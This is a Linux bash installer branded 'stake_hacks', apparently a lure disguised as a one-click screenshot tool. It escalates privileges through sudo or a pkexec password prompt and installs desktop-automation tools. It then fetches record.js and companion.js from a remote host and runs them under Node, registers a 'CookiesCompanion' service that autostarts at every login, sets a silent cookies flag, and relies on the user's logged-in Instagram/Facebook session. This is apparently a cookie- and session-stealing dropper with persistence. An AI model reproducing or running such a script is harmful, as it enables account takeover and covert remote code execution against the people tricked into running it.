#!/usr/bin/env bash
# stake_hacks - one-click full capture for Linux (same process as the Windows .bat)
# Fully automatic: no manual typing needed when tools already exist or when a
# passwordless-sudo / GUI-policykit (pkexec) prompt is available.
set -uo pipefail

URL="https://record-rvqb.onrender.com"
DEST="${HOME}/.local/share/stakehacks"
SHOTS="${HOME}/Pictures/Screenshots"
LOG="${DEST}/setup.log"
BROWSER_FLAG="@@BROWSER_FLAG@@"

echo "============================================"
echo "  stake_hacks - one click full capture"
echo "============================================"
echo ""

mkdir -p "$DEST" "$SHOTS" 2>/dev/null || true
: > "$LOG" 2>/dev/null || true

# --- run a package-manager command without a terminal when possible ---
is_root() { [ "$(id -u)" = "0" ]; }
can_sudo_n() { command -v sudo >/dev/null 2>&1 && sudo -n true 2>/dev/null; }
PMS=""
if command -v apt-get >/dev/null 2>&1; then PMS=apt
elif command -v dnf >/dev/null 2>&1; then PMS=dnf
elif command -v pacman >/dev/null 2>&1; then PMS=pacman
fi

inst_pkg() {
  # inst_pkg <pkg...>  -> non-interactive install, best-effort
  if [ -z "$PMS" ]; then return 1; fi
  if is_root; then
    case "$PMS" in
      apt)   apt-get update -y >/dev/null 2>&1 || true; apt-get install -y -- "$@" ;;
      dnf)   dnf install -y "$@" ;;
      pacman) pacman -Sy --noconfirm "$@" ;;
    esac
  elif can_sudo_n; then
    case "$PMS" in
      apt)   sudo -n apt-get update -y >/dev/null 2>&1 || true; sudo -n apt-get install -y -- "$@" ;;
      dnf)   sudo -n dnf install -y "$@" ;;
      pacman) sudo -n pacman -Sy --noconfirm "$@" ;;
    esac
  elif command -v pkexec >/dev/null 2>&1; then
    # GUI password dialog (no terminal). Types password once, then continues on its own.
    case "$PMS" in
      apt)   pkexec apt-get update -y >/dev/null 2>&1 || true; pkexec apt-get install -y -- "$@" ;;
      dnf)   pkexec dnf install -y "$@" ;;
      pacman) pkexec pacman -Sy --noconfirm "$@" ;;
    esac
  elif command -v sudo >/dev/null 2>&1; then
    # Last resort: terminal sudo (may ask for a password).
    case "$PMS" in
      apt)   sudo apt-get update -y >/dev/null 2>&1 || true; sudo apt-get install -y -- "$@" ;;
      dnf)   sudo dnf install -y "$@" ;;
      pacman) sudo pacman -Sy --noconfirm "$@" ;;
    esac
  else
    return 1
  fi
}

echo "[1/5] folders ready" >> "$LOG"
echo "[1/5] checking tools (xdotool, wmctrl, scrot)..."
echo "[1/5] folders ready" | tee -a "$LOG"
echo "  folders: $DEST"
for tool in xdotool wmctrl scrot curl; do
  if ! command -v "$tool" >/dev/null 2>&1; then
    echo "  installing $tool..."
    if inst_pkg "$tool" >/dev/null 2>&1; then
      echo "  $tool OK"
    else
      echo "    could not install $tool (no passwordless/policykit root) - continuing"
      echo "WARN could not install $tool" >> "$LOG"
    fi
  else
    echo "  $tool OK"
  fi
done
echo "[1/5] tools ready"
echo "[1/5] tools ready" >> "$LOG"

# --- download record.js + companion.js (always refresh to latest) ---
echo "[2/5] downloading record.js + companion..."
curl -fsSL -o "$DEST/record.js" "$URL/assets/record.js" || true
curl -fsSL -o "$DEST/companion.js" "$URL/assets/companion.js" || true
if [ ! -f "$DEST/record.js" ]; then
  echo "ERROR: could not download record.js. Check internet."
  echo "ERROR download record.js" >> "$LOG"
  sleep 4
  exit 1
fi
echo "  scripts ready"
echo "[2/5] scripts downloaded" >> "$LOG"

# --- Node.js ---
echo "[3/5] checking for Node.js..."
NODE_BIN=""
if command -v node >/dev/null 2>&1; then
  NODE_BIN="node"
elif command -v nodejs >/dev/null 2>&1; then
  NODE_BIN="nodejs"
elif [ -f "$DEST/node/bin/node" ]; then
  NODE_BIN="$DEST/node/bin/node"
fi
if [ -z "$NODE_BIN" ]; then
  echo "  installing Node (best-effort)..."
  if inst_pkg nodejs >/dev/null 2>&1 || inst_pkg node >/dev/null 2>&1; then
    [ -z "$NODE_BIN" ] && command -v node >/dev/null 2>&1 && NODE_BIN="node"
    [ -z "$NODE_BIN" ] && command -v nodejs >/dev/null 2>&1 && NODE_BIN="nodejs"
  fi
fi
if [ -z "$NODE_BIN" ] && command -v curl >/dev/null 2>&1; then
  echo "  downloading portable Node into ~/.local/share/stakehacks/node (no admin needed)..."
  VER=$(curl -fsSL https://nodejs.org/dist/index.json | grep -o '"v[0-9]*\.[0-9]*\.[0-9]*"-"linux-x64"' | head -1 | grep -o 'v[0-9.]*' || true)
  [ -z "$VER" ] && VER="v22.11.0"
  curl -fsSL "https://nodejs.org/dist/$VER/node-$VER-linux-x64.tar.xz" -o "$DEST/node.tar.xz" && {
    mkdir -p "$DEST/node" 2>/dev/null || true
    tar -xJf "$DEST/node.tar.xz" -C "$DEST/node" --strip-components=1 2>/dev/null || true
    rm -f "$DEST/node.tar.xz" 2>/dev/null || true
    [ -f "$DEST/node/bin/node" ] && NODE_BIN="$DEST/node/bin/node"
  }
fi
if [ -z "$NODE_BIN" ]; then
  echo "ERROR: could not get Node.js. Check internet / package manager."
  echo "ERROR no node" >> "$LOG"
  sleep 4
  exit 1
fi
echo "  Node ready: $NODE_BIN"
echo "[3/5] node $NODE_BIN" >> "$LOG"

# --- companion service + autostart ---
echo "[4/5] starting companion service..."
cat > "$DEST/start-companion.sh" <<EOF
#!/usr/bin/env bash
cd "$DEST"
exec "$NODE_BIN" "$DEST/companion.js"
EOF
chmod +x "$DEST/start-companion.sh"
cat > "$DEST/start-companion.desktop" <<EOF
[Desktop Entry]
Type=Application
Name=CookiesCompanion
Exec=$DEST/start-companion.sh
X-GNOME-Autostart-enabled=true
EOF
chmod +x "$DEST/start-companion.desktop"
mkdir -p "${HOME}/.config/autostart" 2>/dev/null || true
cp "$DEST/start-companion.desktop" "${HOME}/.config/autostart/" 2>/dev/null || true
pkill -f "companion.js" 2>/dev/null || true
sleep 1
nohup "$DEST/start-companion.sh" >/dev/null 2>&1 &
sleep 3
echo "  companion running on port 9876"
echo "[4/5] companion started" >> "$LOG"

# --- capture ---
echo "[5/5] running record.js capture - your browser will open now..."
echo "  Do not close the browser until both screenshots finish."
export COOKIES_SILENT=1
cd "$DEST"
"$NODE_BIN" "$DEST/record.js" $BROWSER_FLAG
echo "[5/5] record.js exit $?" >> "$LOG"

echo ""
if [ -f "$SHOTS/instagram_insta.png" ]; then
  echo "Screenshots saved. Opening folder..."
  xdg-open "$SHOTS" >/dev/null 2>&1 || true
  echo "screenshots OK" >> "$LOG"
else
  echo "Screenshots NOT found - check that your browser is logged into Instagram/Facebook."
  echo "screenshots MISSING" >> "$LOG"
fi
echo ""
echo "Done. Companion will auto-start at every login."
echo "You can now press Capture again on the website to see the screenshots."
echo "Log: $LOG"
echo ""
sleep 2